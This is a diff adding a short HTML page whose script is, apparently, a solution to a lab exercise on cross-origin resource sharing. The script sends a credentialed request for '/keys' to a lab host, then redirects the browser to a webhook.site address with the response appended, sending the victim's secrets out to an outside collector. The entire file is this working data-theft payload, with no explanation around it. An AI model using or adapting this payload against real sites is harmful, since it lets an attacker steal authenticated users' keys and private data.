@@ -1,0 +1,16 @@
+<html>
+	<script>
+
+		var req = XMLHttpRequest();
+		req.onload = afterLoad;
+		req.open("get","http://ptl-fbafd824-4fabf863.libcurl.so/keys");
+		req.withCredentials = true;
+		req.send();
+
+		function afterLoad(){
+			location = "https://webhook.site/b8d6fabd-4739-4d22-b76a-5718a8da4609?keys=" + this.responseText;
+		}
+
+	</script>
+
+</html>
